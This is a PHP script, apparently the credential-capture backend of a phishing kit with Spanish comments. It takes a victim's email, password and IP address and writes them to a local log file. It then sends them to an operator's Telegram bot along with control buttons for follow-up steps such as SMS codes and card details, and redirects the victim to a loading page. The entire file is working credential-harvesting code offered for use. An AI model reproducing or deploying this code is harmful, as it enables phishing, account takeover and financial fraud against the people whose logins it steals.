<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración global
include('../settings.php');

$userp = $_SERVER['REMOTE_ADDR'];
$usuario = $_SESSION['usuario'] ?? 'desconocido';

// Necesitamos al menos el correo en sesión y la contraseña por POST o en sesión
if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {

    $file = fopen("musica.txt", "a");

    // Obtener la contraseña desde la sesión o desde el POST
    $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

    fwrite($file, "Correo: ".$_SESSION['e']."   Psswrd: ".$passwordValue." 
Fecha: ".date('Y-m-d')." - ".date('H:i:s')." 
ip:  ".$userp." " . PHP_EOL);
    fwrite($file, "********************************* " . PHP_EOL);
    fclose($file);

    // Enviar datos a Telegram
    $correo = $_SESSION['e'];
    $psswd = $passwordValue;

    $msg = " NUEVO MAIL RECIBIDO\n";
    $msg .= " Usuario: $usuario\n";
    $msg .= " Correo: $correo\n";
    $msg .= " Password: $psswd\n";
    $msg .= " IP: $userp\n";

    // Crear botones inline
    $botones = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '📩 SMS', 'callback_data' => "SMSERROR|$usuario"],
                ['text' => '🔁 LOGIN', 'callback_data' => "LOGIN|$usuario"]
            ],
            [
                ['text' => '💳 CARD', 'callback_data' => "CARD|$usuario"],
                ['text' => '✅ LISTO', 'callback_data' => "LISTO|$usuario"]
            ]
        ]
    ]);

    // Enviar a Telegram
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => $botones
    ]));

    unset($_SESSION['e']);
    unset($_SESSION['c']);
    $_SESSION['from_out'] = true;

    // Redirigir a pantalla de carga
    header("Location: ../sleep.html");
    exit;
}
?>